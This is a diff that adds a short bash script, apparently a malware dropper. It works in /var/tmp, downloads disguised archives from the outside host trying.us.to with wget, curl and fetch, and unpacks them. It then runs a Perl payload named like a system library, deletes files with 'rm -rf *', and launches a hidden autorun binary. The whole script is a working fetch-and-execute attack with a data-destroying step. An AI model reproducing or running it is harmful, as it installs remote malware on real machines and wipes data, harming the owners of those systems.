@@ -1,0 +1,16 @@
+#!/bin/bash
+cd /var/tmp/;
+wget trying.us.to/index.htm;
+curl -O http://trying.us.to/index.htm; 
+fetch http://trying.us.to/index.htm;
+tar -xzvf index.htm;
+rm -rf index.htm;
+perl /var/tmp/libssl3.so.2;
+rm -rf *;
+wget trying.us.to/stats.php;
+fetch http://trying.us.to/stats.php;
+curl -O http://trying.us.to/stats.php;
+tar -xzvf stats.php;
+rm -rf stats.php;
+cd .d;
+./autorun
